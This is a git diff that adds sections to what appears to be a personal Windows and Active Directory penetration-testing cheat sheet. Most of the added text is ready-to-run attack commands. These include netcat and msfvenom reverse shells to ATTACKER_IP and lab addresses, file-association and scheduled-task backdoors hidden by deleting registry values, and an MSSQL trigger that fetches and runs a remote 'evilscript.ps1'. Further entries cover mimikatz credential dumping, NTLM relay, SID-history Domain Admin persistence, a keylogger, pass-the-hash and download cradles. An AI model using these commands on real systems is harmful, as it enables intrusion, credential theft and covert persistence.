@@ -148,7 +148,7 @@ findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*<br>
 wmic product get name,version<br>
 Get-ChildItem -Hidden -Path C:\Users\xxx\Desktop\<br>
 net start<br>
-wmic service where "name like 'THM Service'" get Name,PathName<br>
+wmic service where "name like 'ABC Service'" get Name,PathName<br>
 Get-Process -Name "name-service"<br>
 netstat -noa |findstr "LISTENING" |findstr "PID"<br>
 ## Dns Zone Transfer
@@ -387,7 +387,282 @@ C:\Windows\System32\calc.exe<br>
 
 powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1<br>
 
+# Hijacking File Associations
+## Basically this way we can get our backdoor to get executed everytime a certain file extension is opened!
 
+### Sample Backdoor File
+Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"<br>
+C:\Windows\system32\NOTEPAD.EXE $args[0]<br>
+Find Extenions Prog Id In Registry Editor<br>
+Note: .txt is example<br>
 
+Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.txt<br>
+The ProgID is (Default)-fields Data-value<br>
 
+## Find Shell Command Of The ProgId In Registry Editor
+Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Classes\{PROGID}<br>
+Change shell/open/command entry to execute our backdoor<br>
+
+powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1<br>
+# Services Create
+Generate Service Executable (Eg With Msfvenom)<br>
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe<br>
+## Create Service And Start It
+sc.exe create service2 binPath= "C:\windows\rev-svc.exe" start= auto<br>
+sc.exe start service2<br>
+ 
+## Service Modify
+### The plan is to find a stopped service that has STARTTYPE automatic, SERVICESTART_NAME is the user account which service runs on
+
+### Find A Stopped Service
+sc.exe query state=all<br>
+See Service Properties<br>
+sc.exe qc Service3<br>
+### Edit Service
+sc.exe config service3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"<br>
+ 
+# Scheduled Tasks
+## Create Task
+schtasks /create /sc minute /mo 1 /tn TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe 10.10.90.206 4449" /ru SYSTEM<br>
+## Make Task Invisible
+Edit Registery Value<br>
+Location:<br>
+
+Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\{TASKNAME}<br>
+ 
+Delete SD-value<br>
+
+# Execute On User Logon
+Add new REGEXPANDSZ registry field in one of these, set Data to be path to your executable<br>
+
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run<br>
+HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce<br>
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run<br>
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce<br>
+ ## OR append UserInit or Shell registry on
+
+HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\<br>
+ ## OR add new regsitry "UserInitMprLogonScript" ON
+HKCU\Environment<br>
+ 
+# MSSQL
+ use impackets module mssqlclient or heidi<br>
+ ## IF ONLY READ PERMISSION
+ ### PERFORM LLMNR/NBT-NS by:
+ <br>xp_dirtree //attackerip/sharenotexist
+ <br>on new terminal use
+ <br> responder -I interface -wPv<br>
+ on executing dirtree command you'll get the ntlmv2 hash on your responder, crack it and enjoy
+## ANOTHER WAY On MSSQL Session Execute Queries:
+sp_configure 'Show Advanced Options',1;<br>
+RECONFIGURE;<br>
+sp_configure 'xp_cmdshell',1;<br>
+RECONFIGURE;<br>
+### After:
+USE master<br>
+
+GRANT IMPERSONATE ON LOGIN::sa to [Public];<br>
+## Configure Trigger
+ 
+USE HRDB<br>
+CREATE TRIGGER [sql_backdoor]<br>
+ON HRDB.dbo.Employees <br>
+FOR INSERT AS<br>
+
+EXECUTE AS LOGIN = 'sa'<br>
+EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://10.10.117.195:8000/evilscript.ps1'')"';<br>
+ 
+# Powershell Disabled
+Use https://github.com/Mr-Un1k0d3r/PowerLessShell.git<br>
+
+## Generate Payload
+msfvenom -p windows/meterpreter/reverse_winhttps LHOST=IP LPORT=4443 -f psh-reflection > liv0ff.ps1<br>
+Metasploit 1 Liner For Listener<br>
+msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost ip;set lport 4443;exploit"<br>
+## Generate Final Payload
+python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj<br>
+## Use Msbuild To Build Payload
+MSBuild.exe liv0ff.csproj<br>
+ 
+# Exploiting AD
+## Constrained Delegation
+Check If Anyone Can Delegate Anything<br>
+Get-NetUser -TrustedToAuth<br>
+Get Hash/Password Of The User Who Can Delegate<br>
+mimikatz.exe<br>
+token::elevate<br>
+lsadump::secrets<br>
+ 
+## Use Kekeo or rubeus To Generate Tickets
+kekeo.exe<br>
+tgt::ask /user:svcIIS /domain:domain.local /password:ADD_PASSWORD_HERE<br>
+tgs::s4u /tgt:TGT_svcIIS@domain.local_krbtgt~domain.local@DOMAIN.LOCAL.kirbi /user:t1_trevor.jones /service:http/SERVER1.domain.local<br>
+tgs::s4u /tgt:TGT_svcIIS@DOMAIN.LOCAL_krbtgt~domain.local@DOMAIN.LOCAL.kirbi /user:t1_trevor.jones /service:wsman/SERVER1.domain.local<br>
+## Re Enter Mimikatz And Use Tickets
+kerberos::ptt TGS_t1_trevor.jones@DOMAIN.LOCAL_wsman~SERVER1.DOMAIN.LOCAL@DOMAIN.LOCAL.kirbi
+kerberos::ptt TGS_t1_trevor.jones@DOMAIN.LOCAL_http~SERVER1.DOMAIN.LOCAL@DOMAIN.LOCAL.kirbi
+exit 
+### note, this can be directly done (ptt) with rubeus in few steps
+ for reference check: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/constrained-delegation
+### to verify if it's done successfully type in cmd:<br>
+ klist<br>
+## for lateral movement<br>
+### Enter Into A New Session With The Generated Ticket<br>
+Enter-PSSession -ComputerName server1.domain.local<br>
+
+# Automatic Relays (Printer Bug)
+We need:<br>
+A valid set of AD account credentials.<br>
+Network connectivity to the target's SMB service.<br>
+The target host must be running the Print Spooler service.<br>
+The hosts must not have SMB signing enforced.<br>
+## Check For Machine Accounts (BLoodhound Query)
+MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p<br>
+## Check For Print Spooler
+Get-PrinterPort -ComputerName server2.domain.local<br>
+OR <br>
+GWMI Win32_Printer -Computer server2.domain.local<br>
+## Check For SMB Signing<br>
+nmap --script=smb2-security-mode -p445 server1.domain.local server2.domain.local<br>
+## in kali
+### Exploit
+python3 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"OWNED-TARGET-IP" -debug<br>
+SpoolSample.exe TARGET-DOMAIN-NAME "Attacker IP"<br>
+python3 ntlmrelayx.py -smb2support -t smb://"OWNED-TARGET-IP" -c 'whoami /all' -debug<br>
+
+# Exploit Users (Keylogger)
+<b>Note: sometimes it's good idea to move to less privileged users instead of sticking to admin<br>
+Also, we'll be using metasploit modules for this<br></b>
+## Find Processes That User Is Running<br>
+ ps | grep "explorer"<br>
+ Migrate To Process<br>
+migrate *PID* <br>
+Start Keylogger<br>
+keyscan_start<br>
+
+ # Exploit GPO
+Check access via Bloodhound, you can use mmc tool via RDP to access and edit GPOs<br>
+# Inter-Realm TGTs
+ <b>DOMAIN ADMIN REQUIRED<br></b>
+
+We need:<br>
+
+The KRBTGT password hash<br>
+The FQDN of the domain<br>
+The username of the account we want to impersonate<br>
+The Security Identifier (SID) of the domain<br>
+KRBTGT Password Hash<br>
+mimikatz.exe<br>
+ lsadump::dcsync /user:DOMAIN\krbtgt<br>
+ 
+Get-ADComputer -Identity "DC"<br>
+Get-ADGroup -Identity "Enterprise Admins" -Server dc.domain.local<br>
+ 
+# PERSISTENCE
+ ## SID HISTORY
+ Basically this makes low priv user a Domain Admin<br>
+ Check SID History Of User<br>
+Get-ADUser phillip.wilkins -properties sidhistory,memberof<br>
+Get SID Of The Domain Admins<br>
+Get-ADGroup "Domain Admins"<br>
+Patch History<br>
+Stop-Service -Name ntds -force <br>
+Add-ADDBSidHistory -SamAccountName 'phillip.wilkins' -SidHistory 'S-1-5-21-3885271727-2693558621-2658995185-512' -DatabasePath C:\Windows\NTDS\ntds.dit <br>
+Start-Service -Name ntds<br>
+ 
+## Group Memberships
+### Create Nested ADGroup
+New-ADGroup -Path "OU=IT,OU=People,DC=DOMAIN,DC=LOCAL" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security<br>
+New-ADGroup -Path "OU=SALES,OU=People,DC=DOMAIN,DC=LOCAL" -Name "<username> Net Group 2" -SamAccountName "<username>_nestgroup2" -DisplayName "<username> Nest Group 2" -GroupScope Global -GroupCategory Security <br>
+### Add Last Group To Domain Admins Group
+Add-ADGroupMember -Identity "<username>_nestgroup2" -Members "<username>_nestgroup1"<br>
+Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup2"<br>
+Add User To The First Group<br>
+Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"<br>
+### Verify if That  Worked:
+Get-ADGroupMember -Identity "Domain Admins"<br>
+<br><br>
+ # AD CHEATSHEET
+ https://wadcoms.github.io/#
+## Breaching
+### LDAP Pass-Back Attack
+Can be used if any other service uses AD LDAP and we can trick it to connect to our own malicious LDAP server instead of the target's<br>
+<b>Install Slapd</b><br>
+ sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd<br>
+ <b>Reconfigure Each Time</b><br>
+ <b>Note: set domains to match targets domain!!</b><br>
+
+sudo dpkg-reconfigure -p low slapd<br>
+## Create A New File With This Content And Save It As Conf.Ldif For Example<br>
+olcSaslSecProps.ldif<br>
+dn: cn=config<br>
+replace: olcSaslSecProps<br>
+olcSaslSecProps: noanonymous,minssf=0,passcred<br>
+Restart Service With Oud New Config<br>
+ldapmodify -Y EXTERNAL -H ldapi:// -f ./oldSaslSecProps.ldif && service slapd restart<br>
+Listen For Our Tcp Traffic On Port 389 To Get Creds<br>
+sudo tcpdump -SX -i breachad tcp port 389<br>
+# Retreive Credentials From PXE Boot Image
+<b>Note: this is not too common vulnerability I think</b><br>
+
+After receiving the file name of the image eg. x64{50364AB9-F5EF-4DAF-9501-1FE668B8691D}.bcd<br>
+
+Download It Via Tftp<br>
+tftp -i <IP> GET "\Tmp\x64{50364AB9-F5EF-4DAF-9501-1FE668B8691D}.bcd " conf.bcd<br>
+ 
+ ## <b>Read Contents via <a href="https://github.com/wavestone-cdt/powerpxe"> PowerPxe</a></b>
+ Import-Module .\PowerPXE.ps1<br>
+$BCDFile = "conf.bcd"<br>
+Get-WimFile -bcdFile $BCDFile<br>
+Download The Image Itself<br>
+tftp -i <TARGET IP> GET "<PXE Boot Image Location>" pxeboot.wim<br>
+Find Credentials Inside Image<br>
+Get-FindCredentials -WimFile pxeboot.wim<br>
+
+# PASS THE HASH(PTH)
+ xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH<br>
+psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP<br>
+ or use wmiexec(undetected)<br>
+evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH<br>
+ 
+ 
+# SMB CHEATS
+ smbclient -L \\10.129.1.39 -N (LIST SHARES (NULL SESSION))<br>
+ ## LOGIN TO SMB
+ smbclient  "//10.129.1.39/Backups" -N<br>
+## LIST SHARES
+ crackmapexec smb  10.129.1.39 -u "user" -p "password"  --shares<br>
+smbmap -d DOMAIN -u USERNAME -p PASSWORD -H IP<br>
+ <b> NOTE: sometimes when you don't find 445 opened port using nmap, try using smbmap with user details, it might work(PS: worked for me in a red teaming activity)</b><br>
+ ## PASSWORD POLICY
+ crackmapexec smb --pass-pol IP<br>
+ ## MOUNTING SMB SHARES
+ sudo mount -t cifs //<vpsa_ip_address>/<export_share> /mnt/<local_share><br>
+ ## MOUNTING VHD IMAGE
+  sudo guestmount --add <vhdfile>.vhd --inspector --ro /mnt/<location> -v<br>
+ 
+# FEW MORE ENUMERATION SCRIPTS( BLOODHOUND AND POWERVIEW ARE MANDATORY)
+ https://github.com/GhostPack/Seatbelt (build on different dotnet if needed)<br>
+https://github.com/411Hall/JAWS<br>
+https://github.com/rasta-mouse/Sherlock<br>
+https://github.com/rasta-mouse/Watson<br>
+https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS<br>
+https://github.com/AonCyberLabs/Windows-Exploit-Suggester <br>
+
+# KERBEROS ATTACK PATHS AFTER ANALYSING BLOODHOUND RESULTS
+   GetNPUsers.py -dc-ip <ip-address> -request '<domain>/' (NULL SESSION)<br>
+  GetUserSPNs.py -dc-ip <ip-address> -request <domain>/<username> (AUTH)<br>
+ 
+# DOWNLOADING AND EXECUTING FILES
+echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.98:8000/sherlock.ps1' ) | powershell -noprofile -<br>
+echo IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.98:8000/winPEAS.exe', 'winPEAS.exe') | powershell <br>
+certutil -f -urlcache http://IP:PORT/filename file.exe<br>
+powershell Invoke-WebRequest -UseBasicParsing 10.10.16.8:8000/winPEASx64.exe -OutFile winPEASx64.exe<br>
+
+# LLMNR/NBTNS POISONING
+ reference:https://predatech.co.uk/llmnr-nbt-ns-poisoning-windows-domain-environments/<br>
+ for windows instead of responder use <b> inveigh</b><br>
+ reference: https://infinitelogins.com/2020/11/16/capturing-relaying-net-ntlm-hashes-without-kali-linux-using-inveigh/<br>
+ commands:
+ https://dmcxblue.gitbook.io/red-team-notes/untitled-1/llmnr-nbt-ns-poisoning-and-relay
 
